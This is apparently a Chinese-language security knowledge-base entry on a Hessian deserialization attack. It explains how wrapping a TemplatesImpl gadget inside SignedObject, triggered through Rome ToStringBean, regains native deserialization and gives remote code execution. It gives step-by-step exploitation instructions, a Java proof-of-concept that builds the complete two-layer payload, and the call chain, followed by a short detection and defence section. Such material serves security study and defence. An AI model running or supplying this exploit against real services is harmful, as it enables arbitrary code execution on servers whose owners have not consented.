---
id: web-java-deser-hessian-signedobject-second-order-templates
title: Hessian 链用 SignedObject 二次反序列化绕过 transient 限制加载 TemplatesImpl
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: hessian-signedobject-second-order-deserialization
tags:
- java
- hessian
- deserialization
- signedobject
- templatesimpl
- rome
- second-order
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V11
  verified_at: '2026-11-05T01:32:09+08:00'
  notes: 已对照原文及42张图核对：UnsafeSerializer 跳过 transient/static、UnsafeDeserializer.allocateInstance 不执行构造/readObject、TemplatesImpl._tfactory 为 transient 故 Hessian 直链断、TemplatesImpl.readObject 恢复 _tfactory、SignedObject.getObject 对 content 做 ObjectInputStream.readObject、Rome ToStringBean/EqualsBean 外层触发及内层原生 gadget 双层结构，均与图7/15/25-28及调用栈一致；图28显示 calc 执行。版本仅为链依赖(rome 1.0)与 JDK8 环境，非影响区间，未设 versions。PoC未在本机执行。
url: /docs/web/java/deserialization/hessian/web-java-deser-hessian-signedobject-second-order-templates/
draft: false
kb_aliases:
- Hessian SignedObject 二次反序列化
- Hessian 嵌套原生反序列化
- TemplatesImpl transient 绕过
- Rome ToStringBean SignedObject
- Hessian 加载 TemplatesImpl
---

## 一句话结论

Hessian 的 `UnsafeSerializer` 会跳过 `transient` 字段且不执行 `readObject()`，所以 `TemplatesImpl` 因 `_tfactory` 为 transient 无法直接使用；但把标准 `TemplatesImpl` gadget 作为字节流封进 `SignedObject.content`，再由 Rome `ToStringBean` 在 `toString` 中调用 `SignedObject.getObject()`，就会进入 Java 原生 `ObjectInputStream.readObject()`，由 `TemplatesImpl.readObject()` 恢复 `_tfactory`，从而完成字节码加载与 RCE。

## 原理

- Hessian 对自定义类使用 `UnsafeSerializer`/`UnsafeDeserializer`：序列化时跳过 `transient`/`static` 字段，反序列化时用 `Unsafe.allocateInstance()` 创建对象并按字段名反射赋值，不调用构造方法、getter/setter，也不调用类自己的 `readObject()`。
- `TemplatesImpl` 的 `_tfactory` 字段声明为 `private transient TransformerFactoryImpl _tfactory`。直接把它放进 Hessian 流时该字段始终为 null，`getOutputProperties()` 在调用 `_tfactory` 时失败，链断。
- Java 原生反序列化会调用 `TemplatesImpl.readObject()`，该方法内部执行 `_tfactory = new TransformerFactoryImpl();`，所以经典原生 TemplatesImpl 链可以正常打；差异完全来自“是否执行 readObject”。
- `java.security.SignedObject` 的 `getObject()` 实现是：把 `this.content`（byte[]）包成 `ByteArrayInputStream`，再 `new ObjectInputStream(b).readObject()`。也就是说，任何能让 `SignedObject.getObject()` 被调用的 getter 链，都能在 Hessian 流程中重新进入原生反序列化。
- Rome 的 `ToStringBean.toString()` 会遍历 bean 的全部属性并调用 getter；把 `SignedObject` 设为 bean 对象，就会调用 `getObject()`，触发内层原生 `ObjectInputStream`。内层字节流可以是一份完整的原生 TemplatesImpl gadget（HashMap → EqualsBean → ToStringBean → TemplatesImpl.getOutputProperties → defineTransletClasses → 执行 `_bytecodes`）。
- 结构是两层：外层 Hessian `map.put → EqualsBean.hashCode → ToStringBean.toString → SignedObject.getObject`；内层原生 `HashMap.readObject → EqualsBean.hashCode → ToStringBean.toString → TemplatesImpl.getOutputProperties`。

## 触发条件

- 目标存在可控的 Hessian 反序列化入口；
- classpath 含 Rome（`ToStringBean`/`EqualsBean`）或其它能调用 `SignedObject.getObject()` 的 getter 链；
- 目标为 JDK 8 等仍可使用 `TemplatesImpl` + `AbstractTranslet` 字节码加载的环境；
- 攻击者能生成 `AbstractTranslet` 子类的字节码（如 Javassist）并构造 `TemplatesImpl._bytecodes`；
- 未对 `SignedObject`、`ToStringBean`、`TemplatesImpl` 等类做反序列化白名单限制。

## 利用步骤

1. 生成恶意 `AbstractTranslet` 子类字节码，静态初始化块或 `transform` 中执行命令。
2. 构造内层 `TemplatesImpl`：设置 `_name`、`_bytecodes`（`_tfactory` 留空，交给原生 readObject 恢复）。
3. 构造内层原生 gadget：`ToStringBean(Templates.class, templates)` + `EqualsBean(ToStringBean.class, toStringBean)`，放进 `HashMap` 作为 key。
4. 用 RSA 私钥与 `SHA1withRSA` 对第 3 步的 HashMap 做 `SignedObject` 签名封装（`SignedObject` 的构造会序列化 content 并签名）。
5. 构造外层 Hessian 对象：`ToStringBean(SignedObject.class, signedObject)` + `EqualsBean(ToStringBean.class, toStringBean)`，放进外层 `HashMap`，将 `ToStringBean._beanClass` 设为 `SignedObject.class`、`_obj` 设为 signedObject。
6. 用 `HessianOutput.writeObject(外层HashMap)` 生成 payload，发送到目标；服务端 `MapDeserializer.readMap` 的 `map.put` 触发外层 hashCode/toString，进入 `SignedObject.getObject()` 后执行内层原生反序列化。

## PoC

```java
// 1) 恶意 TemplatesImpl
byte[] evil = getEvilBytes();            // AbstractTranslet 子类字节码
TemplatesImpl tpl = new TemplatesImpl();
setField(tpl, "_name", "evil");
setField(tpl, "_bytecodes", new byte[][]{evil});

// 2) 内层原生 gadget（HashMap 触发 TemplatesImpl）
ToStringBean tbInner = new ToStringBean(Templates.class, tpl);
EqualsBean ebInner = new EqualsBean(ToStringBean.class, tbInner);
HashMap<Object,Object> inner = new HashMap<>();
inner.put(ebInner, "x");
setField(tbInner, "_beanClass", Templates.class);
setField(tbInner, "_obj", tpl);

// 3) 用 SignedObject 包裹内层字节流
KeyPair kp = KeyPairGenerator.getInstance("RSA").generateKeyPair();
Signature sig = Signature.getInstance("SHA1withRSA");
SignedObject signed = new SignedObject(inner, kp.getPrivate(), sig);

// 4) 外层 Hessian gadget（ToStringBean 调用 SignedObject.getObject）
ToStringBean tbOuter = new ToStringBean(String.class, "x");
EqualsBean ebOuter = new EqualsBean(ToStringBean.class, tbOuter);
HashMap<Object,Object> outer = new HashMap<>();
outer.put(ebOuter, "x");
setField(tbOuter, "_beanClass", SignedObject.class);
setField(tbOuter, "_obj", signed);

// 5) Hessian 序列化并发送
HessianOutput out = new HessianOutput(bytes);
out.writeObject(outer);
out.flush();
```

关键调用链：

```text
TemplatesImpl.getOutputProperties
  <- ToStringBean.toString
  <- EqualsBean.hashCode
  <- HashMap.readObject            (内层：Java 原生反序列化)
  <- SignedObject.getObject
  <- ToStringBean.toString         (外层：Hessian 触发)
  <- EqualsBean.hashCode
  <- HashMap.put
  <- MapDeserializer.readMap
  <- HessianInput.readObject
```

## 变体与关联

- 同一“二次反序列化”桥可把任意只能走原生链的 gadget（TemplatesImpl、AnnotationInvocationHandler 等）带进 Hessian 入口；SignedObject 只是最常用的载体。
- 外层触发也可换成其它会调用 `getObject()`/getter 的 `toString`/`equals`/`compareTo` 链。
- 使用 Rome `JdbcRowSetImpl` 直接打 JNDI 时需注意：`ToStringBean` 会按顺序调用 `JdbcRowSetImpl` 的多个 getter，`strMatchColumns` 为空会在 `getDatabaseMetaData` 之前抛异常，需预先设置非空 `Vector` 才能走到 sink。
- 关联：[[web-java-deser-hessian-deserialization-entry-map-put]]（Hessian map.put 入口与 transient 约束）；[[web-java-deser-hessian-jndi-outbound-chains]]（Rome/Spring/Resin/XBean JNDI 链）；[[web-java-deserialization-external-xalan-templatesimpl-sink]]（原生 TemplatesImpl sink）。
- 影响边界：成功时在目标 JVM 内执行任意字节码，权限同应用进程；依赖 Rome 与 JDK 8 的 TemplatesImpl 可用性。

## 检测与防御

- 检测：Hessian 流中出现 `java.security.SignedObject`、`com.sun.syndication.feed.impl.ToStringBean`/`EqualsBean`、`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 等类名；反序列化过程中出现 `ObjectInputStream.readObject` 的嵌套调用；JVM 加载动态生成的 `AbstractTranslet` 子类。
- 修复：对 Hessian 使用严格的类允许列表，拒绝 `SignedObject`、Rome、TemplatesImpl 等 gadget 类；不要对不可信数据调用 `readObject`。
- 缓解：升级 JDK 并开启 JEP 290 序列化过滤器（`jdk.serialFilter`）；限制 Hessian 入口访问来源与鉴权；升级 Hessian 并关注官方安全公告。
